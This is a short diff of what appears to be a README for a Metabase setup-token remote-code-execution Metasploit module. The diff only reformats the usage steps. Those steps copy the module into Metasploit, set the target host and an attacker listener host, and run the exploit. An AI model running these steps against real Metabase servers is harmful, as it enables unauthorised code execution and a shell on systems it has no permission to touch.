@@ -26,10 +26,14 @@ cp metabase_setup_token_rce.rb /usr/share/metasploit-framework/modules/exploits/
 msfdb reinit; msfconsole -q
 ```
 ```
-msf6 > use exploit/linux/http/metabase_setup_token_rce.rb
+use exploit/linux/http/metabase_setup_token_rce.rb
 ```
 ```
-msf6 exploit(linux/http/metabase_setup_token_rce.rb) > set rhosts target_IP
-msf6 exploit(linux/http/metabase_setup_token_rce.rb) > set lhost attacker_IP
-msf6 exploit(linux/http/metabase_setup_token_rce.rb) > run
+set rhosts target_IP
+```
+```
+set lhost attacker_IP
+```
+```
+run
 ```
